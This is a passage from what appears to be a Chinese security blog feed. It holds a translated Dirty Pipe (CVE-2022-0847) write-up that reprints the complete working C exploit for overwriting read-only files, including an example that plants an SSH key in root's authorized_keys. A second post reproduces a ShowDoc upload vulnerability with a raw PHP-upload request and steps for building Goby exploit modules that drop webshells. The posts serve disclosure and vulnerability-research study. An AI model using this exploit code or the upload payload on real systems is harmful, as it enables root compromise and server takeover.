cache的角度来看，这一个page的其余部分是未使用的（尽管管道缓冲区代码确实使用它，因为它有自己的页面填充管理）。<br>为什么这种情况不经常发生？因为页面缓存不会写回磁盘，除非它认为页面是“脏”的。意外覆盖页面缓存中的数据不会使页面“脏”。如果没有其他进程“弄脏”文件，则此更改将是短暂的；在下一次重新启动后（或者在内核决定从缓存中删除页面后，比如在内存压力下回收页面），更改将被恢复。这使得有趣的攻击不会在硬盘上留下痕迹。</p><h1 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h1><p>在我的第一个EXP中（我用于bisect的“writer”/“splicer”程序），我假设只有在特权进程写入文件时，才能利用这个漏洞，并且它取决于时间。<br>当我意识到真正的问题是什么时，我能够将漏洞扩大很大一部分：即使在没有写入权限的情况下，也有可能覆盖page cache，而不受时间限制，在(几乎)任意位置的任意数据上。这些限制是：</p><ul><li>攻击者必须具有读取权限（因为它需要将<code>splice()</code> 一个page到一个管道中）。</li><li>偏移量不得位于页面边界上（因为该页的至少一个字节必须拼接到管道中）。</li><li>写入不能跨越页面边界（因为将为剩余部分创建新的匿名缓冲区）。</li><li>无法调整文件大小（因为管道有自己的页面填充管理，并且不会告诉page cache添加了多少数据）<br>要利用此漏洞，您需要：</li></ul><ol><li>创建一个管道。</li><li>用任意数据填充管道（在所有环入口中设置<code>PIPE_BUF_FLAG_CAN_MERGEE</code>flag）。</li><li>排空管道（在<code>struct pipe_inode_info</code>环上的所有<code>struct pipe_buffer</code>实例中保留设置的flag）。</li><li>将目标文件（仅用<code>O_RDONLY</code>打开）中的数据从目标偏移之前拼接到管道中。</li><li>将任意数据写入管道；此数据将覆盖缓存的文件页，而不是创建新的匿名<code>struct pipe_buffer</code>，因为设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 的flag<br>为了使此漏洞更有趣，它不仅可以在没有写权限的情况下工作，还可以在不可修改文件、只读btrfs快照和只读挂载（包括CD-ROM挂载）上工作。这是因为页面缓存始终是可写的（由内核），而写入管道永远不会检查任何权限。<br>这是我的概念证明：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe</span>(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = <span class="hljs-built_in">fcntl</span>(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">loff_t</span> offset = <span class="hljs-built_in">strtoul</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fstat</span>(fd, &amp;st)) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">prepare_pipe</span>(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-keyword">ssize_t</span> nbytes = <span class="hljs-built_in">splice</span>(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = <span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul><li>2021-04-29: 收到第一封关于文件损坏的工单</li><li>2022-02-19: 文件损坏问题被确定为Linux内核错误，这是一个可利用的漏洞</li><li>2022-02-20: 向Linux内核安全团队发送<a href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html">错误报告、漏洞攻击和补丁</a></li><li>2022-02-21: 谷歌Pixel 6上重现的漏洞；发送给安卓安全团队的错误报告</li><li>2022-02-21: 按照Linus Torvalds、Willy Tarreau和Al Viro的建议，将补丁发送给<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">LKML（无漏洞详细信息）</a></li><li>2022-02-23: Linux稳定版修复了我的漏洞（<a href="https://lore.kernel.org/stable/1645618039140207@kroah.com/">5.16.11</a>、<a href="https://lore.kernel.org/stable/164561803311588@kroah.com/">5.15.25</a>、<a href="https://lore.kernel.org/stable/164561802556115@kroah.com/">5.10.102</a>）</li><li>2022-02-24: 谷歌将我的漏洞修复程序合并到<a href="https://android-review.googlesource.com/c/kernel/common/+/1998671">Android内核</a>中</li><li>2022-02-28: 通知<a href="https://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists">linux发行版邮件</a></li><li>2022-03-07: 公开披露列表</li></ul>]]></content>
    
    
    <categories>
      
      <category>文档翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文档翻译</tag>
      
      <tag>CVE-2022-0847</tag>
      
      <tag>Dirty Pipe提权漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次不停自我追问式的学习</title>
    <link href="/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初只是简单的搭建环境，拿着公开的POC复现漏洞。然后想着学学Goby如何编写POC&amp;EXP，先拿GUI的形式编写，但是逐渐发现很多想法都满足不了，于是尝试Go语言编写。但也不满足于此，想去探究漏洞成因于是选择代码审计，最后对漏洞成因进行跟踪溯源，得出一个较为满意的结论！</p><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h1><h2 id="1-1-漏洞速览"><a href="#1-1-漏洞速览" class="headerlink" title="1.1 漏洞速览"></a>1.1 漏洞速览</h2><p>漏洞描述：Showdoc存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。</p><p>漏洞影响：ShowDoc &lt; V2.8.3</p><p>漏洞参考：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585">https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585</a></p><h2 id="1-2-环境搭建"><a href="#1-2-环境搭建" class="headerlink" title="1.2 环境搭建"></a>1.2 环境搭建</h2><p>系统：Windows10</p><p>工具：PHPStudy2016，VScode，Goby，Burp</p><p>环境：showdoc-V2.6.7  <a href="https://github.com/star7th/showdoc">https://github.com/star7th/showdoc</a></p><h2 id="1-3-POC"><a href="#1-3-POC" class="headerlink" title="1.3 POC"></a>1.3 POC</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx">POST /index.php?s=<span class="hljs-regexp">/home/</span>page/uploadImg HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-attr">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">81</span><br>Content-Type: multipart/form-data; boundary=---------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Length: <span class="hljs-number">252</span><br><span class="hljs-attr">Connection</span>: close<br><br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;editormd-image-file&quot;</span>; filename=<span class="hljs-string">&quot;1.&lt;&gt;php&quot;</span><br>Content-Type: text/plain<br><br>&lt;?php phpinfo();?&gt;<br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span>--<br></code></pre></td></tr></table></figure><h2 id="1-4-复现"><a href="#1-4-复现" class="headerlink" title="1.4 复现"></a>1.4 复现</h2><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.png"></p><h1 id="2-利用Goby的GUI编写POC-amp-EXP"><a href="#2-利用Goby的GUI编写POC-amp-EXP" class="headerlink" title="2. 利用Goby的GUI编写POC&amp;EXP"></a>2. 利用Goby的GUI编写POC&amp;EXP</h1><h2 id="2-1-编写POC"><a href="#2-1-编写POC" class="headerlink" title="2.1 编写POC"></a>2.1 编写POC</h2><h3 id="2-1-1-填入基本内容"><a href="#2-1-1-填入基本内容" class="headerlink" title="2.1.1 填入基本内容"></a>2.1.1 填入基本内容</h3><p>可以手动输入，但是由于该漏洞有CNVD编号，于是考虑从命令行导入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//在goby的golib目录下的goby-cmd文件，也可以-h解锁更多操作</span><br>goby-cmd -mode genpoc -CNVDID CNVD-<span class="hljs-number">2020</span>-<span class="hljs-number">26585</span> -exportFile exploits\user\CNVD-<span class="hljs-keyword">export</span>.go<br><span class="hljs-comment">//导出文件在goby的\golib\exploits\user目录下</span><br></code></pre></td></tr></table></figure><p>已知BUG：</p><ol><li>通过命令行导出的文件需要手动加上指纹：<code>&quot;GobyQuery&quot;: &quot;app=\&quot;showDoc\&quot;&quot;</code> ，才可以导入进Goby，不然导入不进去，会报错（在log中可以看到报错信息）</li><li>通过命令行导出的文件导入POC时，测试界面会出现白屏bug，因为ScanSteps中缺少<code>&quot;SetVariable&quot;: []</code> 字段，添加即可。</li></ol><blockquote><p>不想拘泥于手动，虽然导入遇到了不少的麻烦，但是总归是需要尝试的，后续Goby团队也会改进的。</p></blockquote><h3 id="2-2-2-发出请求"><a href="#2-2-2-发出请求" class="headerlink" title="2.2.2 发出请求"></a>2.2.2 发出请求</h3><p>简单的将POC内容复制粘贴进对应字段即可</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%201.png"></p><h3 id="2-2-3-验证响应"><a href="#2-2-3-验证响应" class="headerlink" title="2.2.3 验证响应"></a>2.2.3 验证响应</h3><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%87%86%E7%A1%AE%E6%80%A7">《PoC writing suggestions》中的准确性</a>：增加检测关键字、特殊符号、响应包中独一无二的特征，以提高其准确性。</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%202.png"></p><h3 id="2-2-4-编写POC的Tips"><a href="#2-2-4-编写POC的Tips" class="headerlink" title="2.2.4 编写POC的Tips"></a>2.2.4 编写POC的Tips</h3><ol><li>修改POC之后记得保存后，再进行单IP测试</li><li>由于Goby可能因为缓存等机制，导致修改POC并保存之后，即使发包也是未修改之前的包，需要返回漏洞管理界面再重新载入POC才行</li><li>由于上述载入载出步骤较为麻烦，我采用<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D">Goby脚手架</a>的方式，在VSCode修改代码的同时在CMD中测试： <code>goby-cmd -mode runpoc -operation scan -pocFile exploits\user\a.go -target 127.0.0.1</code></li><li>脚手架的方式不支持burp代理调试。如果需要对POC进行代理调试的话，推荐依然使用GUI的方法，详见<a href="https://mp.weixin.qq.com/s/IeftOSV29DbDgeClqXqnkg">《Json 编写 PoC&amp;EXP 遇到的那些坑》</a></li></ol><h2 id="2-2-编写EXP"><a href="#2-2-编写EXP" class="headerlink" title="2.2 编写EXP"></a>2.2 编写EXP</h2><p>总体思路同上POC的问题，只不过将上传的验证性文件切换为一句话、菜刀等类型木马文件，然后在浏览器中访问对应连接即可。</p><p>仔细查看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%BC%96%E5%86%99">官方文档的EXP部分</a> ，实际操作步骤如下：</p><ol><li>将 <code>HasExp</code> 字段设置为 true</li><li>在POC界面编写EXP后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>上传文件内容更改为冰蝎马，上传一句话木马同理</li><li>直接将返回的链接扔到冰蝎里面连接即可。</li></ol><p>已知问题：</p><ol><li>GobyGUI目前暂不支持EXP用GUI编写，借用POC界面编写后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>抓包问题：pcap模式扫描127.0.0.1无IP存活，但是socket模式下可以扫127.0.0.1</li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%203.png"></p><h2 id="2-3-进一步优化POC-amp-EXP"><a href="#2-3-进一步优化POC-amp-EXP" class="headerlink" title="2.3 进一步优化POC&amp;EXP"></a>2.3 进一步优化POC&amp;EXP</h2><h3 id="2-3-1-自动删除上传文件"><a href="#2-3-1-自动删除上传文件" class="headerlink" title="2.3.1 自动删除上传文件"></a>2.3.1 自动删除上传文件</h3><p>在公网测试的时候，发现一个很不好的现象：某站点上存在大量这类一句话木马。</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%204.png"></p><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E6%97%A0%E5%AE%B3%E6%80%A7">《PoC writing suggestions》的无害性</a>： 我们需要将上传的文件进行删除。虽然第一次第二次很麻烦，但是优秀是需要形成习惯的。</p><p>问题：</p><ol><li>如何删除上传文件？PHP中可以利用<code>unlink()</code>函数来删除文件</li><li>如何触发<code>unlink()</code>函数？连续发出两次请求。第一次请求用于上传文件，第二次请求用于触发<code>unlink()</code>函数删除文件</li><li>如何获取第二次请求的链接？第一次的返回包中有返回绝对路径，且Goby可以基于正则提取第一次请求的响应，并在第二次利用，详见Goby<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#json-%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91%E6%89%8B%E5%86%8C">《POC编写指南之JSON 录入漏洞逻辑手册》</a></li><li>如何编写正则？先百度正则语法，再用<a href="https://regex101.com/">regex101平台</a>进行测试</li><li>如何去掉链接<code>/\</code>这些符号？化繁为简，分析文件路径组成：Hostinfo+Public/Uploads+日期+随机文件名，后两个变量分两次正则提取，然后整体拼接即可</li></ol><p>问题解决了，步骤自然清晰：</p><ol><li>在上传的文件末尾增加<code>unlink()</code>函数</li><li>在第一次请求的正则部分增加自定义变量<code>date</code>和<code>file</code></li><li>在Goby中添加第二次请求的URL中使用这两个变量<code>/Public/Uploads/&#123;&#123;&#123;date&#125;&#125;&#125;/&#123;&#123;&#123;file&#125;&#125;&#125;</code></li><li>如果第二次响应为200即可算作成功</li></ol><p><img 